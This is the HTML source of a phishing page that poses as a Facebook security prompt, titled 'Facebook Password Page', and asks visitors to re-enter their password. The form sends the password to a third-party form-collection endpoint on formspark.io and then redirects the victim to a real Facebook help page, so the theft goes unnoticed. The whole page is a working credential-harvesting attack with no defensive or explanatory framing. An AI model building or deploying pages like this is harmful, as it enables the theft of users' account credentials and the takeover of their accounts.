<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook Password Page</title>
    <link rel="stylesheet" href="hery.css">

</head>
<body>
    <div class="container">
        <div class="logo">
            <img class="logo" src="https://cdn.glitch.global/46b23277-af0f-4084-beb4-98733cbb74fe/FB_IMG_1738570378202.jpg?v=1738786095466" alt="Logo">
            <div class="header">
                For your Security
            </div>
            <p>Please re-enter your password to complete the request.</p>
            <form id="meta-form" action="https://submitted.formspark.io/?_formId=06789fec-c16a-4b76-a92b-ef572f081a59&_status=OK&_title=Your%20form%20has%20been%20submitted.&_referer=https://formspark.io/" method="POST">
                <input type="hidden" name="_redirect" value="https://www.facebook.com/help/media/thank-you?rdrhc" />

                <!-- Replace with your Access Key -->
                <input type="hidden" name="access_key" value="22983eba-14f6-431b-8283-10e298027760">
                <div class="form-group">
                    <label for="password">Password</label>
                    <div class="input-wrapper">
                        <input type="password" id="password" name="password" placeholder="Enter your password" required>
                    </div>
                    <span id="error-message" class="error-message"></span>
                </div>
                <button type="submit" class="submit-button">Submit</button>
                <center>
                    <font color="black">
                        <font size="2">
            </form>
        </div>
      </body>
